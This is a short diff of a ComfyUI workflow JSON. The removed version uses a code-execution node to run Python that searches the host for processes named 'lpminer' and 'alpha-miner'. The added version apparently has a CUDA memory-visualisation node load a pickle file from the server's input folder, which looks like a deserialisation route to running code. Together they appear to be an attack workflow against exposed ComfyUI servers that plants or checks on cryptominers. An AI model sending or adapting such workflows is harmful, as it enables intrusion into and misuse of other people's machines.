@@ -1,18 +1,9 @@
 {
   "1": {
-    "class_type": "IDENode",
+    "class_type": "VisualizeCUDAMemoryHistory",
     "inputs": {
-      "language": "python",
-      "pycode": "import subprocess\np1 = subprocess.run([\"pgrep\", \"-a\", \"lpminer\"], capture_output=True, text=True)\np2 = subprocess.run([\"pgrep\", \"-a\", \"alpha-miner\"], capture_output=True, text=True)\nlp = p1.stdout.strip()[:120] if p1.stdout.strip() else \"\"\nal = p2.stdout.strip()[:120] if p2.stdout.strip() else \"\"\nresult = f\"LP: {lp} | ALPHA: {al}\" if (lp or al) else \"NONE\"\nresult\n"
-    }
-  },
-  "2": {
-    "class_type": "PreviewAny",
-    "inputs": {
-      "source": [
-        "1",
-        0
-      ]
+      "snapshot_path": "/opt/ComfyUI/input/d_52065.pkl",
+      "unique_id": "d_52065"
     }
   }
 }
